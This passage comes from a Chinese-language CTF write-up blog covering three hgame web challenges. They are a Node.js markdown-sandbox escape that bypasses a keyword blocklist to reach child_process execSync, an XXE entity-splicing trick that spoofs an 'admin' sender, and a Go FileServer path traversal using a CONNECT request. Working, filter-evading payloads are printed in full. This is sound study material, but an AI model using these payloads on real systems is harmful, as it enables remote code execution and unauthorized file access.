<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:[&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;]&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/d2fa4389a9b445df9018554a2a25d2bc.png"></p>
<p>接着审计提交的控制器</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/3129c99ebe7a4c7aadbc3b615f8c883b.png"></p>
<p>先将传入的代码进行md渲染编程html，接着利用Browser中的load进行操作</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/83294ba23687463095dd83f0c1482d1a.png"></p>
<p>load又调用了<strong>this.tabs.open({ html: html })</strong> 其实这里的 <code>open</code> 就是漏洞的入口</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/a87d55d81699455498438500ee44d1c2.png"></p>
<p>剩下分析移步<a target="_blank" rel="noopener" href="https://blog.summ3r.top/2021/08/26/Nodejs-Zoombie-Package-RCE-%E5%88%86%E6%9E%90/#toc-heading-3">Nodejs Zoombie Package RCE 分析</a></p>
<p><strong>祥云杯是通过visit为入口，这道题是以load为入口</strong>，那整体就是，将传入的代码在提交之后渲染为html，然后放入沙箱中运行，让其逃逸即可，这里还需要markdown的语法<br><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/8b68affbe67541449948ff012d5c2b9b.png"></p>
<p>发现在 vm 模块运行js代码，代码运行的上下文是 <strong>window对象</strong></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/eb178b651c8c4f4ba68c8eff47f64201.png"><br>但是这里存在一个waf</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function waf(code) &#123;</span><br><span class="line">    const blacklist &#x3D; &#x2F;__proto__|prototype|\+|atlert|confirm|escape|parseInt|parseFloat|prompt|isNaN|new|this|process|constructor|atob|btoa|apk&#x2F;i</span><br><span class="line">    if (code.match(blacklist)) &#123;</span><br><span class="line">        return &quot;# Hacker!&quot;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return code</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了关键词，给出两种 <strong>绕过</strong>，当我想要以相同方式 <strong>绕过this时</strong>，发现对于this不适用，然后找到了这篇文章</p>
<p> <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7842">nodejs沙箱与黑魔法 - 先知社区 (aliyun.com)</a></p>
<p>尝试调用 <strong>window 的方法</strong> 然后调用 <strong>constructor</strong> 向上 返回的一个 <strong>Function constructor</strong> 然后 <strong>利用Function对象构造一个函数并执行</strong></p>
<p>Payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var a&#x3D;&#39;const&#39;;var b&#x3D;&#39;ructor&#39;;var c&#x3D;[a,b].join(&#39;&#39;);</span><br><span class="line">var d&#x3D;&#39;return p&#39;;var e&#x3D;&#39;rocess&#39;;var f&#x3D;[d,e].join(&#39;&#39;);</span><br><span class="line">var h&#x3D;&#39;child_p&#39;;var i&#x3D;[h,e].join(&#39;&#39;);</span><br><span class="line">var j&#x3D;&#39;th&#39;;var k&#x3D;&#39;is&#39;;var l&#x3D;[j,k].join(&#39;&#39;);</span><br><span class="line">x&#x3D; clearImmediate [c][c][c][c](f)();y&#x3D;x.mainModule.require(i);z&#x3D;y.execSync(&#39;whoami&#39;).toString();document.write(z);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">var h&#x3D;&#39;child_p&#39;;var e&#x3D;&#39;rocess&#39;;var i&#x3D;[h,e].join(&#39;&#39;);</span><br><span class="line">x&#x3D;clearImmediate[&#96;$&#123;&#96;$&#123;&#96;constructo&#96;&#125;r&#96;&#125;&#96;][&#96;$&#123;&#96;$&#123;&#96;constructo&#96;&#125;r&#96;&#125;&#96;][&#96;$&#123;&#96;$&#123;&#96;constructo&#96;&#125;r&#96;&#125;&#96;]([&#96;$&#123;&#96;$&#123;&#96;return proces&#96;&#125;s&#96;&#125;&#96;])();y&#x3D;x.mainModule.require(i);z&#x3D;y.execSync(&#39;cat &#x2F;flag&#39;).toString();document.write(z);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/6cb270c147964b539322a1ddeeffcc19.png"></p>
<p>Flag：hgame{3nj0y*Th3/<em>pR0tOtype</em>/pOllut10n!1n_j@v4scr1pt}</p>
<p>后续测试，构造一个constructor即可，成功的window方法：</p>
<blockquote>
<p>btoa、cancelAnimationFrame、captureEvents、clearImmediate，print等等可以自行寻找</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/fetch_api/fetch_api-sk372v9v.html">window方法：clearImmediate()_w3cschool</a></p>
<p>相关文章：<br>Markdown xss payload<br> <a target="_blank" rel="noopener" href="https://github.com/cujanovic/Markdown-XSS-Payloads/blob/master/Markdown-XSS-Payloads.txt">Markdown-XSS-Payloads.txt</a></p>
<p>nodejs 沙盒逃逸<br><a target="_blank" rel="noopener" href="https://jelly.jd.com/article/5f7296d0c526ae0148c2a2bb">Node.js沙盒逃逸分析</a><br><a target="_blank" rel="noopener" href="https://www.kitsch.live/2020/11/23/nodejs-vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">nodejs-vm沙箱逃逸</a><br><a target="_blank" rel="noopener" href="https://www.scuctf.com/ctfwiki/web/1.nodejs/nodejs%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/readme/#2020-hufuctfweb-just_escape">NodeJs 沙盒逃逸分析及原型链的简单学习</a></p>
<p>nodejs编码：<br><a target="_blank" rel="noopener" href="https://bycsec.top/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/">Nodejs的一些技巧</a><br><a target="_blank" rel="noopener" href="https://www.zhangshengrong.com/p/bYXxqOkL1Z/">nodejs代码执行绕过的一些技巧汇总</a></p>
<p>vm2逃逸payload项目<br><a target="_blank" rel="noopener" href="https://github.com/patriksimek/vm2">https://github.com/patriksimek/vm2</a>  </p>
<h1 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h1><ul>
<li>xxe</li>
</ul>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/7b42abd264574b36bbacd915c8fe3093.png"></p>
<p><strong>libxml_disable_entity_loader(false); 允许外部实体</strong>，waf了一些关键字</p>
<p>返回flag的逻辑就是sender需要为admin，但是post数据包里不能有admin关键字</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/d6dff84ab533457895fb6e6b649480fa.png#pic_center"></p>
<p>本想在content通过一百万个字符绕过preg_match，然后发现题目环境不可以，那就进行外部实体拼接绕过<br>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;ad&quot; &gt;</span><br><span class="line">&lt;!ENTITY xxe2 &quot;min&quot; &gt;]&gt;</span><br><span class="line">&lt;comment&gt;&lt;sender&gt;&amp;xxe;&amp;xxe2;&lt;&#x2F;sender&gt;&lt;content&gt;123&lt;&#x2F;content&gt;&lt;&#x2F;comment&gt;</span><br></pre></td></tr></table></figure>
<p>Flag：hgame{Pr3ud0~prOtQc4l*m33ts_Xx3-!nj3cti0n~!}</p>
<h1 id="FileSystem"><a href="#FileSystem" class="headerlink" title="FileSystem"></a>FileSystem</h1><ul>
<li>go安全</li>
</ul>
<p>两个文件</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/d5813c0c6b5c498c83a59bbd487c628e.png"></p>
<p>Main.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fileHandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	http.FileServer(http.Dir(<span class="string">&quot;./&quot;</span>)).ServeHTTP(w, r)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/&quot;</span>, fileHandler)</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/there_may_be_a_flag&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">		w.Write([]<span class="keyword">byte</span>(<span class="string">`No! You can&#x27;t see the flag!`</span>))</span><br><span class="line">	&#125;)</span><br><span class="line">	log.Fatal(http.ListenAndServe(<span class="string">&quot;:8889&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>there_may_be_a_flag</strong> 就是flag的地方，加上了web服务的flag路由,从而使得我们没法通过直接访问/flag来获取文件。而是得到/flag路由的回显。也就是 No! You can’t see the flag!</p>
<p>审计完再结合题目觉得应该是 **http.FileServer(http.Dir(&quot;./&quot;)).ServeHTTP(w, r)**，出了问题，应该是存在漏洞导致可以跨目录读取到flag，搜索了一下，找到了go的一些安全问题</p>
<p><a target="_blank" rel="noopener" href="https://bycsec.top/2021/02/07/golang%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">golang的一些安全问题</a></p>
<p>随后发现了漏洞的出处 <strong>justCTF [*] 2020：Go-fs</strong>，出题人在github提交了issue，<a target="_blank" rel="noopener" href="https://github.com/golang/go/issues/40940">https://github.com/golang/go/issues/40940</a></p>
<p>在ctf中还出现了非预期解法，利用一下非预期来解一下题目</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X CONNECT --path-as-is http:&#x2F;&#x2F;3445d0f8a3.filesystem.hgame.homeboyc.cn&#x2F;123&#x2F;..&#x2F;there_may_be_a_flag</span><br></pre></td></tr></table></figure>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/88f1846c011f4986afec3e87954e2559.png#pic_center"><br>非预期的原理：<br>如果是 <strong>CONNECT</strong> 方式请求，就 <strong>不会处理url中的特殊字符</strong>，导致直接读取flag.其他的请求方法都会在cleanPath中被处理url，golang1.16似乎已经处理了。</p>

    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2023/12/25/Fastjson(%E4%BA%8C)/" rel="prev" title="Fastjson 1.2.25-1.2.47">
                  <i class="fa fa-angle-left"></i> Fastjson 1.2.25-1.2.47
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2023/12/25/FastJson(%E4%B8%80)/" rel="next" title="Fastjson1.22-1.24反序列化之TemplateImpl">
                  Fastjson1.22-1.24反序列化之TemplateImpl <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Y0ng</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  





</body>
</html>
